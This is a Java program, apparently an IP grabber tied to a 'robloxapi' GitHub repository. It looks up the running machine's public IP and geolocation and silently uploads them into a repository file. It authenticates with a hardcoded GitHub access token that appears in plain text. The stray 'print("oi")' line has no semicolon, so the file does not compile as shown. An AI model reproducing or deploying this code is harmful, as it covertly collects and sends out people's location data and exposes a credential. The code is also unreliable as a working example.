import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Base64;

public class java {

    public static void main(String[] args) {
        print("oi")
            
        try {

            HttpClient client = HttpClient.newHttpClient();

            // PEGA IP
            String publicIP = client.send(
                    HttpRequest.newBuilder()
                            .uri(URI.create("https://api.ipify.org"))
                            .build(),
                    HttpResponse.BodyHandlers.ofString()
            ).body();

            // PEGA JSON
            String json = client.send(
                    HttpRequest.newBuilder()
                            .uri(URI.create("https://ipwho.is/" + publicIP))
                            .header("User-Agent", "Mozilla/5.0")
                            .build(),
                    HttpResponse.BodyHandlers.ofString()
            ).body();

            System.out.println("JSON: " + json);

            String owner = "Stacks-Development-Open-Source";
            String repo = "robloxapi";
            String path = "data.json";
            String token = "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";

            String apiUrl = "https://api.github.com/repos/" + owner + "/" + repo + "/contents/" + path;

            // 1. PEGA SHA ATUAL DO ARQUIVO
            HttpRequest getFile = HttpRequest.newBuilder()
                    .uri(URI.create(apiUrl))
                    .header("Authorization", "Bearer " + token)
                    .build();

            HttpResponse<String> fileResponse =
                    client.send(getFile, HttpResponse.BodyHandlers.ofString());

            String sha = fileResponse.body()
                    .split("\"sha\":\"")[1]
                    .split("\"")[0];

            // 2. CODIFICA JSON
            String encoded = Base64.getEncoder().encodeToString(json.getBytes());

            // 3. ATUALIZA ARQUIVO
            String body = "{"
                    + "\"message\":\"update json\","
                    + "\"content\":\"" + encoded + "\","
                    + "\"sha\":\"" + sha + "\""
                    + "}";

            HttpRequest update = HttpRequest.newBuilder()
                    .uri(URI.create(apiUrl))
                    .header("Authorization", "Bearer " + token)
                    .header("Accept", "application/vnd.github+json")
                    .PUT(HttpRequest.BodyPublishers.ofString(body))
                    .build();

            HttpResponse<String> response =
                    client.send(update, HttpResponse.BodyHandlers.ofString());

            System.out.println("GitHub response: " + response.body());

        } catch (Exception e) {
            e.printStackTrace();
        }
        
    }
}
